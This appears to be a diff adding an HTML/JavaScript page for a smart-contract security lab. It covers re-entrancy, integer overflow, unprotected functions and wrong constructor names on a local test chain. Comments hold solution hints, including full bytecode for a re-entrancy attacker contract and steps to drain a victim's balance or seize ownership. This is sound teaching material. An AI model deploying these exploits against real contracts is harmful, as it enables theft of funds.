+const CTF03_ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"migrate_and_destroy","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"buy","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"frozenAccount","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"},{"name":"_extraData","type":"bytes"}],"name":"approveAndCall","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"tokenName","type":"string"},{"name":"tokenSymbol","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"target","type":"address"},{"indexed":false,"name":"frozen","type":"bool"}],"name":"FrozenFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_owner","type":"address"},{"indexed":true,"name":"_spender","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Approval","type":"event"}]
+let CTF03_ADDR = null;
+let ctf03_contract = null;
+
+function create_03 () {
+	[ CTF03_ADDR, ctf03_contract ]  = instantiate_contract ('ctf_03_addr', CTF03_ABI, 'ctf_03_methods');
+}
+
+const CTF03_attacker_ABI = [{"type":"function","stateMutability":"payable","payable":true,"outputs":[],"name":"attack","inputs":[{"type":"address","name":"targetAddress"}],"constant":false}]
+let CTF03_attacker_ADDR = null;
+let ctf03_attacker_contract = null;
+
+function create_03_attacker () {
+	[ CTF03_attacker_ADDR, ctf03_attacker_contract ]  = instantiate_contract ('ctf_03_attacker_addr', CTF03_attacker_ABI, 'ctf_03_attacker_methods');
+}
+</script>
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 4: Incorrect interface</h1>
+
+<p>
+A contract interface defines functions with a different type signature than the implementation, causing two different method id's to be created. As a result, when the interfact is called, the fallback method will be executed.
+</p>
+<!--
+	Solution:
+
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_04_addr" size="80" value="0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9"></input>
+			<button onclick="create_04 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_04_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+<!--	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_04_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_04_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_04_call_method', 'ctf_04_call_args', ctf04_contract, 'ctf_04_output')">Call</button>
+		</td>
+	</tr> -->
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_04_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_04_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_04_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_04_send_method', 'ctf_04_send_args', 'ctf_04_value', ctf04_contract, 'ctf_04_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_04_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF04_ABI = [{"constant":false,"inputs":[{"name":"c","type":"address"}],"name":"set","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"c","type":"address"}],"name":"set_fixed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+let CTF04_ADDR = null;
+let ctf04_contract = null;
+
+function create_04 () {
+	[ CTF04_ADDR, ctf04_contract ]  = instantiate_contract ('ctf_04_addr', CTF04_ABI, 'ctf_04_methods');
+}
+</script>
+
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 5: Integer overflow</h1>
+
+<p>
+It is possible to cause add and sub to overflow (or underflow) on any type of integer in Solidity.
+</p>
+<!--
+	Solution:
+		Just keep adding, baby ;)
+		2^256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_05_addr" size="80" value="0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9"></input>
+			<button onclick="create_05 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_05_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+<!--	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_05_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_05_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_05_call_method', 'ctf_05_call_args', ctf05_contract, 'ctf_05_output')">Call</button>
+		</td>
+	</tr> -->
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_05_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_05_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_05_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_05_send_method', 'ctf_05_send_args', 'ctf_05_value', ctf05_contract, 'ctf_05_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_05_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF05_ABI = [{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"add","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"safe_add","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+let CTF05_ADDR = null;
+let ctf05_contract = null;
+
+function create_05 () {
+	[ CTF05_ADDR, ctf05_contract ]  = instantiate_contract ('ctf_05_addr', CTF05_ABI, 'ctf_05_methods');
+}
+</script>
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 7: Re-entrancy</h1>
+
+<p>
+A state variable is changed after a contract uses call.value. The attacker uses a fallback function—which is automatically executed after Ether is transferred from the targeted contract—to execute the vulnerable function again, before the state variable is changed.
+</p>
+<!--
+	Solution:
+
+	1.- Create a contract with the following data:
+		ABI: [{"constant":false,"inputs":[{"name":"limit","type":"int256"}],"name":"attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"get_money","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"addBooty","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"victim_addr","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]
+		Bytecode: 0x60806040526001805534801561001457600080fd5b506040516020806108cc8339810180604052602081101561003457600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506107f6806100d66000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806380f9f254146101e7578063b802926914610222578063f6e12c2214610239575b6100bc606060405190810160405280603881526020017f5b5265656e7472616e63792d41747461636b65725d2066616c6c6261636b2e2081526020017f43757272656e7420726563757273696f6e5f6c696d69743a0000000000000000815250610243565b6100c7600154610341565b600060015413156101e55760018060008282540392505081905550610147606060405190810160405280603181526020017f5b5265656e7472616e63792d41747461636b65725d2063616c6c696e6720746881526020017f652076696374696d20616761696e2e2e2e000000000000000000000000000000815250610243565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101cc57600080fd5b505af11580156101e0573d6000803e3d6000fd5b505050505b005b3480156101f357600080fd5b506102206004803603602081101561020a57600080fd5b81019080803590602001909291905050506103da565b005b34801561022e57600080fd5b506102376104ef565b005b61024161063c565b005b61033e816040516024018080602001828103825283818151815260200191508051906020019080838360005b8381101561028a57808201518184015260208101905061026f565b50505050905090810190601f1680156102b75780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506106dc565b50565b6103d781604051602401808281526020019150506040516020818303038152906040527f4e0c1d1d000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506106dc565b50565b80600181905550610446606060405190810160405280603381526020017f5b5265656e7472616e63792d41747461636b65725d207374617274656420617481526020017f7461636b28292077697468206c696d69743a2000000000000000000000000000815250610243565b61044f81610341565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156104d457600080fd5b505af11580156104e8573d6000803e3d6000fd5b5050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561054b57600080fd5b6105d6608060405190810160405280604b81526020017f5b5265656e7472616e63792d41747461636b65725d2073656c662d646573747281526020017f756374696e6720616e642073656e64696e6720616c6c2066756e64732062616381526020017f6b20746f206f776e65723a000000000000000000000000000000000000000000815250610243565b610601600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16610705565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c0e317fb346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156106c157600080fd5b505af11580156106d5573d6000803e3d6000fd5b5050505050565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6107c781604051602401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f2c2ecbc2000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506106dc565b5056fea165627a7a723058200d4fa44b27888a3c88ea258666a9806a755ace295d06834750d240477b265ff50029
+		Args: 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 (the victim's contract address)
+
+	2.- (simulate some other clients calling `addToBalance` on the victim, so there's some balance to steal)
+	3.- Initialise the attacker `addBooty` with some wei. Every recursion, this same amount of wei will be retrieved
+	4.- Call the attacker's `attack` to retrieve (booty * recursion) wei
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_07_addr" size="80" value="0x5FC8d32690cc91D4c39d9d3abcBD16989F875707"></input>
+			<button onclick="create_07 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_07_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_07_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_07_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_07_call_method', 'ctf_07_call_args', ctf07_contract, 'ctf_07_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_07_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_07_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_07_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_07_send_method', 'ctf_07_send_args', 'ctf_07_value', ctf07_contract, 'ctf_07_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_07_output"></div>
+		</td>
+	</tr>
+</table>
+
+<table>
+	<tr>
+		<th>(ATTACKER!) Contract address</th>
+		<td>
+			<input type="text" id="ctf_07_attacker_addr" size="80" value="0x00"></input>
+			<button onclick="create_07_attacker ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract methods</th>
+		<td>
+			<div id="ctf_07_attacker_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_07_attacker_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_07_attacker_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_07_attacker_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_07_attacker_send_method', 'ctf_07_attacker_send_args', 'ctf_07_attacker_value', ctf07_attacker_contract, 'ctf_07_attacker_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract output</th>
+		<td>
+			<div id="ctf_07_attacker_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF07_ABI = [{"constant":false,"inputs":[],"name":"withdrawBalance_fixed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"withdrawBalance","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"addToBalance","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"withdrawBalance_fixed_2","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"u","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]
+let CTF07_ADDR = null;
+let ctf07_contract = null;
+
+function create_07 () {
+	[ CTF07_ADDR, ctf07_contract ]  = instantiate_contract ('ctf_07_addr', CTF07_ABI, 'ctf_07_methods');
+}
+
+const CTF07_attacker_ABI = [{"constant":false,"inputs":[{"name":"limit","type":"int256"}],"name":"attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"get_money","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"addBooty","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"victim_addr","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]
+let CTF07_attacker_ADDR = null;
+let ctf07_attacker_contract = null;
+
+function create_07_attacker () {
+	[ CTF07_attacker_ADDR, ctf07_attacker_contract ]  = instantiate_contract ('ctf_07_attacker_addr', CTF07_attacker_ABI, 'ctf_07_attacker_methods');
+}
+</script>
+
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 8: Unchecked external call</h1>
+
+<p>
+Certain Solidity operations known as "external calls", require the developer to manually ensure that the operation succeeded. This is in contrast to operations which throw an exception on failure. If an external call fails, but is not checked, the contract will continue execution as if the call succeeded. This will likely result in buggy and potentially exploitable behavior from the contract.
+</p>
+<!--
+	Solution:
+
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_08_addr" size="80" value="0x0165878A594ca255338adfa4d48449f69242Eb8F"></input>
+			<button onclick="create_08 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_08_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_08_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_08_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_08_call_method', 'ctf_08_call_args', ctf08_contract, 'ctf_08_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_08_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_08_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_08_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_08_send_method', 'ctf_08_send_args', 'ctf_08_value', ctf08_contract, 'ctf_08_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_08_output"></div>
+		</td>
+	</tr>
+</table>
+
+<table>
+	<tr>
+		<th>(ATTACKER!) Contract address</th>
+		<td>
+			<input type="text" id="ctf_08_attacker_addr" size="80" value="0x00"></input>
+			<button onclick="create_08_attacker ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract methods</th>
+		<td>
+			<div id="ctf_08_attacker_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_08_attacker_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_08_attacker_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_08_attacker_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_08_attacker_send_method', 'ctf_08_attacker_send_args', 'ctf_08_attacker_value', ctf08_attacker_contract, 'ctf_08_attacker_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>(ATTACKER!) Contract output</th>
+		<td>
+			<div id="ctf_08_attacker_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF08_ABI = [{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"sweepCommission","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"currentClaimPrice","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"pastMonarchs","outputs":[{"name":"etherAddress","type":"address"},{"name":"name","type":"string"},{"name":"claimPrice","type":"uint256"},{"name":"coronationTimestamp","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"name","type":"string"}],"name":"claimThrone","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[],"name":"numberOfMonarchs","outputs":[{"name":"n","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"currentMonarch","outputs":[{"name":"etherAddress","type":"address"},{"name":"name","type":"string"},{"name":"claimPrice","type":"uint256"},{"name":"coronationTimestamp","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":false,"stateMutability":"nonpayable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":false,"name":"usurperEtherAddress","type":"address"},{"indexed":false,"name":"usurperName","type":"string"},{"indexed":false,"name":"newClaimPrice","type":"uint256"}],"name":"ThroneClaimed","type":"event"}]
+let CTF08_ADDR = null;
+let ctf08_contract = null;
+
+function create_08 () {
+	[ CTF08_ADDR, ctf08_contract ]  = instantiate_contract ('ctf_08_addr', CTF08_ABI, 'ctf_08_methods');
+}
+
+const CTF08_attacker_ABI = [{"constant":false,"inputs":[],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"victim_addr","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}];
+let CTF08_attacker_ADDR = null;
+let ctf08_attacker_contract = null;
+
+function create_08_attacker () {
+	[ CTF08_attacker_ADDR, ctf08_attacker_contract ]  = instantiate_contract ('ctf_08_attacker_addr', CTF08_attacker_ABI, 'ctf_08_attacker_methods');
+}
+</script>
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 9: Unprotected function</h1>
+
+<p>
+Missing (or incorrectly used) modifier on a function allows an attacker to use sensitive functionality in the contract.
+</p>
+<!--
+	Solution:
+		Nothing special, just call `changeOwner` and see how it's changed
+		With `changeOwner_fixed`, it should return an error message instead
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_09_addr" size="80" value="0xa513E6E4b8f2a923D98304ec87F64353C4D5C853"></input>
+			<button onclick="create_09 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_09_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_09_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_09_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_09_call_method', 'ctf_09_call_args', ctf09_contract, 'ctf_09_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_09_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_09_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_09_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_09_send_method', 'ctf_09_send_args', 'ctf_09_value', ctf09_contract, 'ctf_09_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_09_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF09_ABI = [{"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"changeOwner_fixed","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
+let CTF09_ADDR = null;
+let ctf09_contract = null;
+
+function create_09 () {
+	[ CTF09_ADDR, ctf09_contract ]  = instantiate_contract ('ctf_09_addr', CTF09_ABI, 'ctf_09_methods');
+}
+</script>
+
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 10: Variable Shadowing</h1>
+
+<p>
+Variable shadowing occurs when a variable declared within a certain scope (decision block, method, or inner class) has the same name as a variable declared in an outer scope.
+</p>
+<!--
+	Solution:
+
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_10_addr" size="80" value="0x2279B7A0a67DB372996a5FaB50D91eAA73d2eBe6"></input>
+			<button onclick="create_10 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_10_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_10_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_10_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_10_call_method', 'ctf_10_call_args', ctf10_contract, 'ctf_10_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_10_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_10_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_10_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_10_send_method', 'ctf_10_send_args', 'ctf_10_value', ctf10_contract, 'ctf_10_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_10_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF10_ABI = [{"constant":false,"inputs":[],"name":"suicide","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]
+let CTF10_ADDR = null;
+let ctf10_contract = null;
+
+function create_10 () {
+	[ CTF10_ADDR, ctf10_contract ]  = instantiate_contract ('ctf_10_addr', CTF10_ABI, 'ctf_10_methods');
+}
+</script>
+
+
+<hr/>
+
+<!-- ======================================== -->
+
+<h1>Vuln 11: Wrong constructor name</h1>
+
+<p>
+A function intended to be a constructor is named incorrectly, which causes it to end up in the runtime bytecode instead of being a constructor.
+</p>
+<!--
+	Solution:
+		Just call `IamMissing` and become the owner, ez peasy
+-->
+<table>
+	<tr>
+		<th>Contract address</th>
+		<td>
+			<input type="text" id="ctf_11_addr" size="80" value="0x8A791620dd6260079BF849Dc5567aDC3F2FdC318"></input>
+			<button onclick="create_11 ();">Instantiate</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract methods</th>
+		<td>
+			<div id="ctf_11_methods" class="level_methods" ></div>
+		</td>
+	</tr>
+	<tr>
+		<th>Call contract (no state alter)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_11_call_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_11_call_args" size="59" value=""></input><br/>
+			<button onclick="call_contract ('ctf_11_call_method', 'ctf_11_call_args', ctf11_contract, 'ctf_11_output')">Call</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Send to contract (alters state)</th>
+		<td>
+			Method name (w/o parentheses): <input type="text" id="ctf_11_send_method" size="50" value="info"></input><br/>
+			Args (comma-separated): <input type="text" id="ctf_11_send_args" size="59" value=""></input><br/>
+			Value (Wei): <input type="text" id="ctf_11_value" size="75" value=""></input><br/>
+			<button onclick="send_to_contract ('ctf_11_send_method', 'ctf_11_send_args', 'ctf_11_value', ctf11_contract, 'ctf_11_output')">Send</button>
+		</td>
+	</tr>
+	<tr>
+		<th>Contract output</th>
+		<td>
+			<div id="ctf_11_output"></div>
+		</td>
+	</tr>
+</table>
+
+<script>
+const CTF11_ABI = [{"constant":false,"inputs":[],"name":"IamMissing","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+let CTF11_ADDR = null;
+let ctf11_contract = null;
+
+function create_11 () {
+	[ CTF11_ADDR, ctf11_contract ]  = instantiate_contract ('ctf_11_addr', CTF11_ABI, 'ctf_11_methods');
+}
+</script>
+
+<!-- To avoid having to click every time the page loads -->
+<script>
+	connect ();
+	settAttackerAddress ();
+	setPrivateKey ();
+</script>
+
+</body>
+</html>
